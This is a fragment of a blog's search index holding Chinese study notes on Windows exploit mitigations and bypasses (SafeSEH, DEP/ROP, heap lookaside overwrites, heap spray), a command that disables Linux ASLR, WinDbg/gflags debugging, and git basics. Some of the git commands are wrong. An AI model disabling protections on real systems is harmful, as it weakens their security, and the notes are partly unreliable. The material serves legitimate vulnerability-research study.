&#x82E5;&#x4E0D;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x5219;&#x4E0D;&#x4F1A;&#x6267;&#x884C;<br>&#x68C0;&#x6D4B;&#x65B9;&#x5F0F;(&#x548C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4EE5;&#x53CA;&#x7F16;&#x8BD1;&#x5668;&#x9009;&#x9879;&#x6709;&#x5173;):</p><ol><li>&#x5148;&#x83B7;&#x53D6;&#x6808;&#x7684;&#x9AD8;&#x5730;&#x5740;&#x548C;&#x4F4E;&#x5730;&#x5740;, &#x901A;&#x8FC7;&#x67E5;&#x8BE2;TEB&#x4E2D;&#x7684;FS:[4]&#x548C;FS:[8], &#x82E5;&#x6307;&#x9488;&#x6307;&#x5411;&#x8BE5;&#x8303;&#x56F4;&#x5219;&#x4E0D;&#x4F1A;&#x6267;&#x884C;.</li><li>&#x68C0;&#x67E5;&#x662F;&#x5426;&#x5728;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x5217;&#x8868;&#x7684;&#x67D0;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x4E2D;, &#x7EE7;&#x7EED;&#x68C0;&#x6D4B; &#x662F;&#x5426;&#x6709;&#x201D;Load Configuration Directory&#x201D;.</li><li>&#x5176;&#x4F59;&#x7684;&#x6709;, &#x5C06;SEH&#x94FE;&#x590D;&#x5236;&#x4E00;&#x904D;&#x5B58;&#x50A8;, &#x7136;&#x540E;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;</li></ol><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>&#x4F7F;&#x5F97;&#x6808;&#x533A;&#x88AB;&#x8986;&#x76D6;&#x7684;&#x4F4D;&#x7F6E;&#x6570;&#x636E;&#x4E0D;&#x5141;&#x8BB8;&#x6267;&#x884C;, CPU&#x7684;NX(&#x65E0;&#x6267;&#x884C;&#x9875;-AMD), XD(&#x4E0D;&#x80FD;&#x6267;&#x884C;-intel)<br>&#x786C;&#x4EF6;DEP, 64&#x4F4D;&#x7CFB;&#x7EDF;DEP&#x603B;&#x662F;&#x5F00;&#x542F;, &#x4E0D;&#x5141;&#x8BB8;&#x5173;&#x95ED;(?)</p><h4 id="ROP&#x94FE;"><a href="#ROP&#x94FE;" class="headerlink" title="ROP&#x94FE;"></a>ROP&#x94FE;</h4><p>VirtualAlloc, VirtualProtect</p><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>Windows</p><p>Linux&#x4F7F;&#x7528; echo &#x201C;0&#x201D; &gt; /proc/sys/kernel/randomize_va_space &#x5173;&#x95ED;ASLR<br>/proc/sys/kernel/randomize_va_space&#xFF1A;<br>0 &#x5173;&#x95ED;<br>1 &#x5F00;&#x542F;<br>2 &#x5728;1&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x589E;&#x52A0;&#x4E86;heap&#x968F;&#x673A;&#x5316;</p><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><p>&#x5E38;&#x89C1;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236;</p><h3 id="safe-unlink"><a href="#safe-unlink" class="headerlink" title="safe unlink"></a>safe unlink</h3><p>freelists&#x7684;&#x4FDD;&#x62A4;<br>** &#x7A33;&#x5B9A;&#x5229;&#x7528;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x5FEB;&#x8868;(lookaside lists) **<br>lookaside&#x653B;&#x51FB;&#x5BFC;&#x81F4;&#x4EFB;&#x610F;&#x56DB;&#x5B57;&#x8282;&#x5199;, &#x53EF;&#x4EE5;&#x8986;&#x76D6;SEH, &#x7136;&#x540E;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x9664;0&#x5F02;&#x5E38;&#x5BFC;&#x81F4;&#x5229;&#x7528;</p><h3 id="ASLR-1"><a href="#ASLR-1" class="headerlink" title="ASLR"></a>ASLR</h3><p>** heap spray **</p><h3 id="DEP-1"><a href="#DEP-1" class="headerlink" title="DEP"></a>DEP</h3><p>Linux  NX&#xFF1A;&#x4E0D;&#x53EF;&#x6267;&#x884C;&#x5185;&#x5B58;<br>** rop **</p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="http://blog.sina.com.cn/s/blog_702eef6501011v07.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_702eef6501011v07.html</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存对齐</title>
      <link href="/2017/01/02/memory-alignment/"/>
      <url>/2017/01/02/memory-alignment/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x5728;&#x770B;C++&#x53CD;&#x6C47;&#x7F16;&#x4E00;&#x4E66;&#x65F6;&#xFF0C;&#x5728;&#x7C7B;&#x7684;&#x4E00;&#x7AE0;&#x524D;&#x9762;&#x4ECB;&#x7ECD;&#x4E86;&#x7ED3;&#x6784;&#x4F53;&#x4E2D;&#x53D8;&#x91CF;&#x7684;&#x5185;&#x5B58;&#x5206;&#x914D;&#xFF0C;&#x4F1A;&#x9075;&#x5FAA;&#x4E00;&#x4E9B;&#x5BF9;&#x9F50;&#x7684;&#x539F;&#x5219;&#xFF0C;&#x5BFC;&#x81F4;&#x5206;&#x914D;&#x7684;&#x5B57;&#x8282;&#x6570;&#x4F1A;&#x6709;&#x6240;&#x5DEE;&#x5F02;&#x3002;<br>&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x4F7F;&#x7528;&#x5185;&#x5B58;&#x5BF9;&#x9F50;&#xFF0C;&#x4EE5;&#x53CA;&#x9075;&#x5FAA;&#x54EA;&#x4E9B;&#x89C4;&#x5219;&#x3002;</p><h2 id="&#x4E3A;&#x4EC0;&#x4E48;&#x5185;&#x5B58;&#x5BF9;&#x9F50;"><a href="#&#x4E3A;&#x4EC0;&#x4E48;&#x5185;&#x5B58;&#x5BF9;&#x9F50;" class="headerlink" title="&#x4E3A;&#x4EC0;&#x4E48;&#x5185;&#x5B58;&#x5BF9;&#x9F50;"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x5185;&#x5B58;&#x5BF9;&#x9F50;</h2><p>&#x8FD9;&#x548C;CPU&#x6709;&#x5173;&#xFF0C;32&#x4F4D;&#x7684;CPU&#x5BF9;&#x5E94;&#x7684;&#x662F;&#x4E00;&#x6B21;&#x4ECE;&#x5185;&#x5B58;&#x4E2D;&#x8BFB;&#x53D6;4&#x5B57;&#x8282;&#xFF0C;&#x5E76;&#x4E14;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x4ECE;4&#x7684;&#x500D;&#x6570;&#x7684;&#x5730;&#x5740;&#x5F00;&#x59CB;&#x8BFB;&#x3002;<br>&#x4F7F;&#x7528;&#x5185;&#x5B58;&#x5BF9;&#x5176;&#x4E3B;&#x8981;&#x907F;&#x514D;&#x7684;&#x662F;&#xFF0C;&#x672C;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x7684;&#x53D8;&#x91CF;&#x9700;&#x8981;&#x4E24;&#x6B21;&#x8BFB;&#x53D6;&#x3002;<br>&#x5047;&#x8BBE;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x7684;int&#x578B;&#x53D8;&#x91CF;&#xFF0C;&#x82E5;&#x5B58;&#x50A8;&#x5728;0x03 - 0x06&#x5730;&#x5740;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x8BFB;&#x53D6;&#x4E24;&#x6B21;&#xFF0C;&#x624D;&#x80FD;&#x53D6;&#x51FA;&#x8FD9;&#x4E2A;&#x503C;&#xFF0C;&#x5148;&#x8BFB;&#x53D6;0x00-0x03&#x8FD9;&#x56DB;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8BFB;&#x53D6;0x04-0x07&#x8FD9;&#x56DB;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x8FD9;&#x6837;&#x4F1A;&#x5BFC;&#x81F4;&#x8BFB;&#x53D6;&#x6548;&#x7387;&#x964D;&#x4F4E;&#xFF1B;&#x82E5;&#x6309;&#x7167;&#x5BF9;&#x9F50;&#x539F;&#x5219;&#xFF0C;&#x53EA;&#x9700;&#x5C06;&#x5176;&#x5206;&#x914D;&#x5728;0x04 - 0x07&#x5373;&#x53EF;&#xFF0C;&#x4E00;&#x6B21;&#x4FBF;&#x80FD;&#x591F;&#x8BFB;&#x51FA;&#x3002;</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Usage of Windbg</title>
      <link href="/2016/12/11/Command-of-Windbg/"/>
      <url>/2016/12/11/Command-of-Windbg/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="windbg-&#x57FA;&#x672C;&#x547D;&#x4EE4;&#x6536;&#x96C6;"><a href="#windbg-&#x57FA;&#x672C;&#x547D;&#x4EE4;&#x6536;&#x96C6;" class="headerlink" title="windbg &#x57FA;&#x672C;&#x547D;&#x4EE4;&#x6536;&#x96C6;"></a>windbg &#x57FA;&#x672C;&#x547D;&#x4EE4;&#x6536;&#x96C6;</h2><table><thead><tr><th>Command</th><th>Usage</th><th>Example</th></tr></thead><tbody><tr><td>lm</td><td>&#x663E;&#x793A;&#x52A0;&#x8F7D;&#x7684;module</td><td>lm v</td></tr><tr><td>ln</td><td>&#x67E5;&#x770B;&#x9644;&#x8FD1;&#x7684;&#x7B26;&#x53F7;&#x6587;&#x4EF6;</td><td>ln eax</td></tr><tr><td>dps</td><td>&#x67E5;&#x770B;&#x7B26;&#x53F7;</td><td>dps eax</td></tr><tr><td>gu</td><td>&#x6267;&#x884C;&#x5230;&#x5F53;&#x524D;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#x65F6;&#x505C;&#x4E0B;</td><td>gu</td></tr><tr><td>p</td><td>&#x5355;&#x6B65;&#x6B65;&#x8FC7;</td><td>p p2</td></tr><tr><td>t</td><td>&#x5355;&#x6B65;&#x6B65;&#x5165;</td><td>t t2</td></tr><tr><td><a href="#b">b</a></td><td>&#x8BBE;&#x7F6E;&#x65AD;&#x70B9;</td><td>ba bp</td></tr></tbody></table><h2 id="&#x51E0;&#x4E2A;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E0E;&#x8BBE;&#x7F6E;"><a href="#&#x51E0;&#x4E2A;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E0E;&#x8BBE;&#x7F6E;" class="headerlink" title="&#x51E0;&#x4E2A;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E0E;&#x8BBE;&#x7F6E;"></a>&#x51E0;&#x4E2A;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E0E;&#x8BBE;&#x7F6E;</h2><table><thead><tr><th>Command</th><th>Usage</th><th>Command</th><th>Usage</th></tr></thead><tbody><tr><td><a href="#pageheap">pageheap</a></td><td>XXXX</td><td>XXX</td><td></td></tr><tr><td><a href="#x">x</a></td><td>X</td><td>X</td><td></td></tr><tr><td>X</td><td>X</td><td>X</td><td></td></tr></tbody></table><h2 id="x"><a href="#x" class="headerlink" title="x"></a>x</h2><p>windbg&#x7684;x&#x547D;&#x4EE4;&#x7528;&#x6237;&#x663E;&#x793A;&#x6240;&#x6709;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x5339;&#x914D;&#x6307;&#x5B9A;&#x6A21;&#x677F;&#x7684;&#x7B26;&#x53F7;, &#x7528;&#x6237;&#x5BFB;&#x627E;&#x76F8;&#x5E94;&#x7684;&#x65AD;&#x70B9;&#x4F4D;&#x7F6E;<br>&#x5373;x &#x540E;&#x9762;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;, &#x7136;&#x540E;&#x663E;&#x793A;&#x6240;&#x6709;&#x5339;&#x914D;&#x7684;&#x7B26;&#x53F7;,<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:011&gt; x mshtml!Alternate*</span><br><span class="line">69bd6e80 mshtml!AlternateFontNameIfAvailable = &lt;no <span class="hljs-built_in">type</span> information&gt;</span><br><span class="line">697cfd9d mshtml!AlternateFontName = &lt;no <span class="hljs-built_in">type</span> information&gt;</span><br></pre></td></tr></tbody></table></figure><br><code>*</code>&#x4EE3;&#x8868;&#x96F6;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x5B57;&#x7B26;<br><code>?</code>&#x4EE3;&#x8868;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;<br><code>+d</code>&#x4EE3;&#x8868;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x5B57;&#x7B26;<p></p><p>x&#x8FD8;&#x6709;&#x4E2A;&#x4F5C;&#x7528;, &#x5728;&#x51FD;&#x6570;&#x65AD;&#x4E0B;&#x6765;&#x540E;&#x8F93;&#x5165;x, &#x4F1A;&#x81EA;&#x52A8;&#x6253;&#x5370;&#x51FA;&#x5F53;&#x524D;&#x7684;&#x5C40;&#x90E8;&#x53D8;&#x91CF;</p><h2 id="b"><a href="#b" class="headerlink" title="b"></a>b</h2><p><code>ba</code> &#x8BBE;&#x7F6E;&#x5185;&#x5B58;&#x65AD;&#x70B9;<br><code>ba Access Size</code><br>Access &#x5305;&#x62EC; e (&#x6267;&#x884C;)&#xFF0C; r (&#x8BFB;/&#x5199;)&#xFF0C; w(&#x5199;)<br></p><figure class="highlight cmd hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ba r4 <span class="hljs-number">0</span>x0033c558</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="pageheap"><a href="#pageheap" class="headerlink" title="pageheap"></a>pageheap</h2><p><strong>&#x6B63;&#x5E38;&#x9875;&#x5806;</strong> , &#x5B83;&#x5728;&#x5DF2;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x7684;&#x540E;&#x9762;&#x653E;&#x4E0A;&#x51E0;&#x4E2A;&#x5B88;&#x62A4;&#x5B57;&#x8282;(Guard Bytes), &#x7C7B;&#x4F3C;&#x4E8E;security cookie&#xFF0C;&#x518D;&#x8DDF;&#x4E0A;&#x4E00;&#x4E2A;&#x6807;&#x8BB0;&#x4E3A;PAGE_NOACCESS&#x7684;&#x5185;&#x5B58;&#x9875;&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5DF2;&#x5206;&#x914D;&#x5185;&#x5B58;&#x7684;&#x540E;&#x9762;&#x5982;&#x679C;&#x88AB;&#x91CD;&#x5199;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x5B88;&#x62A4;&#x5B57;&#x8282;&#x5C31;&#x4F1A;&#x88AB;&#x6539;&#x53D8;&#xFF0C;&#x4E8E;&#x662F;&#x5F53; <strong>&#x5185;&#x5B58;&#x88AB;&#x91CA;&#x653E;</strong> &#x65F6;&#xFF0C;PageHeap&#x5C31;&#x4F1A;&#x5F15;&#x53D1;&#x4E00;&#x4E2A;AV&#x3002;<br><strong>&#x5B8C;&#x5168;&#x9875;&#x5806;</strong> , &#x5F53;&#x5206;&#x914D;&#x4E00;&#x5757;&#x5185;&#x5B58;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x5185;&#x5B58;&#x5757;&#x7684;&#x5206;&#x914D;&#x4F4D;&#x7F6E;&#xFF0C;&#x4F7F;&#x5176;&#x7ED3;&#x5C3E;&#x6070;&#x597D;&#x4E0E;&#x7CFB;&#x7EDF;&#x5206;&#x9875;&#x8FB9;&#x754C;&#x5BF9;&#x9F50;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x8FB9;&#x754C;&#x5904;&#x518D;&#x591A;&#x5206;&#x914D;&#x4E00;&#x4E2A; <strong>&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x9875;</strong>&#x4F5C;&#x4E3A;&#x4FDD;&#x62A4;&#x533A;&#x57DF;&#x3002;<br>&#x56E0;&#x6B64;&#x4E00;&#x822C;UAF&#x7684;&#x6D1E;&#x5F00;&#x542F;&#x9875;&#x5806;&#x4E4B;&#x540E;&#x5F88;&#x5927;&#x53EF;&#x80FD;&#x4E0A;&#x53EF;&#x4EE5;&#x5B9A;&#x4F4D;&#x5230;&#x91CA;&#x653E;&#x7684;&#x4F4D;&#x7F6E;, &#x800C;&#x4E0D;&#x662F;&#x91CD;&#x65B0;&#x4F7F;&#x7528;&#x89E6;&#x53D1;&#x7684;AV.</p><p>&#x7528;gflag.exe&#x5F00;&#x542F;&#x548C;&#x5173;&#x95ED;&#xFF0C;&#x52A0;/full&#x8868;&#x793A;&#x5F00;&#x542F;&#x5B8C;&#x5168;&#x9875;&#x5806;<br></p><figure class="highlight cmd hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gflags /p /enable calc.exe /full</span><br><span class="line">gflags /I calc.exe +hpa</span><br><span class="line">gflags /p /disable calc.exe /full</span><br><span class="line">gflags /I calc.exe -hpa</span><br></pre></td></tr></tbody></table></figure><br>IE&#x5F00;&#x542F;&#x9875;&#x5806;&#x548C;&#x5806;&#x6808;&#x8DDF;&#x8E2A;<br><figure class="highlight cmd hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gflags.exe /i iexplore.exe +ust +hpa</span><br></pre></td></tr></tbody></table></figure><br><a href="http://blog.csdn.net/zcc1414/article/details/38396411" target="_blank" rel="noopener"></a><p></p><h2 id="ust-user-stack-trace"><a href="#ust-user-stack-trace" class="headerlink" title="ust(user stack trace)"></a>ust(user stack trace)</h2></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> windbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about ActiveX</title>
      <link href="/2016/12/11/About-ActiveX/"/>
      <url>/2016/12/11/About-ActiveX/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="ActiveX"><a href="#ActiveX" class="headerlink" title="ActiveX?"></a>ActiveX?</h2><p>&#x6700;&#x8FD1;&#x51C6;&#x5907;&#x8C03;&#x4E00;&#x4E0B;ActiveX&#x76F8;&#x5173;&#x7684;&#x6EA2;&#x51FA;&#x7684;&#x6D1E;, &#x5148;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;ActiveX&#x63A7;&#x4EF6;&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;<br>&#x7B80;&#x5355;&#x8BF4;&#x662F;ActiveX&#x63A7;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x96C6;&#x5408;, &#x4E00;&#x4E2A;ActiveX&#x63A7;&#x4EF6;&#x7C7B;&#x4F3C;&#x4E8E;&#x4E00;&#x4E2A;dll, ActiveX&#x63A7;&#x4EF6;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5F00;&#x53D1;, &#x4E5F;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x5176;&#x63A5;&#x53E3;&#x4F7F;&#x7528;.</p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IE Debug</title>
      <link href="/2016/12/10/IE-Debug/"/>
      <url>/2016/12/10/IE-Debug/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="IDA-&#x5BFC;&#x5165;&#x7B26;&#x53F7;&#x6587;&#x4EF6;"><a href="#IDA-&#x5BFC;&#x5165;&#x7B26;&#x53F7;&#x6587;&#x4EF6;" class="headerlink" title="IDA &#x5BFC;&#x5165;&#x7B26;&#x53F7;&#x6587;&#x4EF6;"></a>IDA &#x5BFC;&#x5165;&#x7B26;&#x53F7;&#x6587;&#x4EF6;</h2><p>&#x5F53;&#x5DF2;&#x7ECF;&#x6709;&#x7B26;&#x53F7;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;, &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5BFC;&#x5165;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File -&gt; Load Files -&gt; pdb file</span><br></pre></td></tr></tbody></table></figure><br>&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x53D8;&#x91CF;, &#x6765;&#x5BFC;&#x5165;&#x5FAE;&#x8F6F;&#x7684;&#x7B26;&#x53F7;&#x6587;&#x4EF6;(&#x672A;&#x6210;&#x529F;!!!)<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_NT_SYMBOL_PATH = symsrv*symsrv.dll*F:\Symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6709;&#x65F6;&#x5019;IDA&#x65E0;&#x6CD5;&#x81EA;&#x52A8;&#x4E0B;&#x8F7D;, &#x53EF;&#x4EE5;&#x5148;&#x7528;windbg&#x52A0;&#x8F7D;, &#x7136;&#x540E;&#x5BFC;&#x5165;pdb</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>usage of git</title>
      <link href="/2016/12/05/Usage-of-Git/"/>
      <url>/2016/12/05/Usage-of-Git/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="git-&#x57FA;&#x7840;&#x4F7F;&#x7528;"><a href="#git-&#x57FA;&#x7840;&#x4F7F;&#x7528;" class="headerlink" title="git &#x57FA;&#x7840;&#x4F7F;&#x7528;"></a>git &#x57FA;&#x7840;&#x4F7F;&#x7528;</h2><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="hljs-comment">#&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;git&#x9879;&#x76EE;</span></span><br><span class="line">git add . <span class="hljs-comment">#&#x5C06;&#x6539;&#x52A8;&#x6DFB;&#x52A0;&#x5230;&#x4E00;&#x4E2A;&#x6682;&#x5B58;&#x533A;, &#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x4FEE;&#x6539;</span></span><br><span class="line">git commit -m <span class="hljs-string">&quot;commit info&quot;</span> <span class="hljs-comment">#&#x771F;&#x6B63;&#x7684;&#x63D0;&#x4EA4;, &#x5C06;&#x4FDD;&#x5B58;&#x4FEE;&#x6539;</span></span><br><span class="line">git info <span class="hljs-comment">#&#x76F8;&#x5173;&#x63D0;&#x4EA4;&#x7684;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="git-&#x5220;&#x9664;"><a href="#git-&#x5220;&#x9664;" class="headerlink" title="git &#x5220;&#x9664;"></a>git &#x5220;&#x9664;</h2><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git rm file <span class="hljs-comment">#&#x5220;&#x9664;&#x6587;&#x4EF6;</span></span><br><span class="line">git rm -rf file <span class="hljs-comment">#&#x5220;&#x9664;&#x6587;&#x4EF6;&#x5939;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="git-push&#x5230;&#x8FDC;&#x7A0B;git&#x670D;&#x52A1;&#x5668;"><a href="#git-push&#x5230;&#x8FDC;&#x7A0B;git&#x670D;&#x52A1;&#x5668;" class="headerlink" title="git push&#x5230;&#x8FDC;&#x7A0B;git&#x670D;&#x52A1;&#x5668;"></a>git push&#x5230;&#x8FDC;&#x7A0B;git&#x670D;&#x52A1;&#x5668;</h2><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin (git repository)</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="git-pull&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x5230;&#x672C;&#x5730;"><a href="#git-pull&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x5230;&#x672C;&#x5730;" class="headerlink" title="git pull&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x5230;&#x672C;&#x5730;"></a>git pull&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x5230;&#x672C;&#x5730;</h2><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master <span class="hljs-comment">#&#x8FDC;&#x7A0B;master&#x5206;&#x652F;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="git-&#x5206;&#x652F;&#x7BA1;&#x7406;"><a href="#git-&#x5206;&#x652F;&#x7BA1;&#x7406;" class="headerlink" title="git &#x5206;&#x652F;&#x7BA1;&#x7406;"></a>git &#x5206;&#x652F;&#x7BA1;&#x7406;</h2><p>git &#x5206;&#x652F;&#x7BA1;&#x7406;&#x57FA;&#x672C;&#x539F;&#x5219;, master&#x5206;&#x652F;&#x4EC5;&#x7528;&#x4E8E;&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x7684;&#x5206;&#x652F;, &#x7528;&#x4E8E;&#x7248;&#x672C;&#x7684;&#x7BA1;&#x7406;&#x548C;&#x6700;&#x540E;&#x7684;&#x5B8C;&#x6210;&#x7248;&#x672C;&#x5F00;&#x53D1;&#x7684;&#x8BDD;, &#x4F7F;&#x7528;&#x5206;&#x652F;develop, &#x56E0;&#x6B64;&#x4FDD;&#x6301;&#x4E24;&#x4E2A;&#x5E38;&#x7528;&#x5206;&#x652F;, master&#x548C;develop. &#x82E5;&#x9700;&#x8981;&#x8C03;&#x8BD5;bug&#x7B49;&#x64CD;&#x4F5C;, &#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x7684;&#x5206;&#x652F;, &#x7528;&#x5B8C;&#x5373;&#x5220;&#x9664;&#x6389;&#x5373;&#x53EF;.    </p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git branch <span class="hljs-comment">#&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7684;&#x5206;&#x652F;&#x5C5E;&#x4E8E;&#x4EC0;&#x4E48;</span></span><br><span class="line">git branch a <span class="hljs-comment">#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;a&#x7684;&#x5206;&#x652F;, &#x6B64;&#x65F6;a&#x5206;&#x652F;&#x548C;&#x5F53;&#x524D;&#x5206;&#x652F;&#x5185;&#x5BB9;&#x4E00;&#x81F4;</span></span><br><span class="line">git branch -b a master <span class="hljs-comment">#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5206;&#x652F;a, &#x5E76;&#x5207;&#x6362;&#x5230;&#x5206;&#x652F;a, &#x6B64;&#x65F6;a&#x5206;&#x652F;&#x5185;&#x5BB9;&#x548C;master&#x5206;&#x652F;&#x4E00;&#x81F4;</span></span><br><span class="line">git checkout a <span class="hljs-comment">#&#x5207;&#x6362;&#x5230;&#x5206;&#x652F;a</span></span><br><span class="line">git merge a <span class="hljs-comment">#&#x5C06;&#x5206;&#x652F;a&#x5408;&#x5E76;&#x5230;&#x5F53;&#x524D;&#x5206;&#x652F;</span></span><br><span class="line">git branch -d a <span class="hljs-comment">#&#x5220;&#x9664;&#x5206;&#x652F;a</span></span><br><span class="line">git branch -D a <span class="hljs-comment">#&#x5F3A;&#x5236;&#x5220;&#x9664;&#x5206;&#x652F;a</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="git-&#x7248;&#x672C;&#x7BA1;&#x7406;"><a href="#git-&#x7248;&#x672C;&#x7BA1;&#x7406;" class="headerlink" title="git &#x7248;&#x672C;&#x7BA1;&#x7406;"></a>git &#x7248;&#x672C;&#x7BA1;&#x7406;</h2><p>&#x4E00;&#x822C;&#x7248;&#x672C;&#x662F;&#x5728;master&#x5206;&#x652F;&#x4E0A;, &#x5BF9;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#x8FDB;&#x884C;&#x7248;&#x672C;&#x8BBE;&#x5B9A;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git tag v1.0 <span class="hljs-comment">#&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;v1.0&#x7248;&#x672C;</span></span><br><span class="line">git checkout v1.0 <span class="hljs-comment">#&#x5207;&#x6362;&#x5230;&#x7248;&#x672C;v1.0</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="git-&#x7248;&#x672C;&#x56DE;&#x9000;"><a 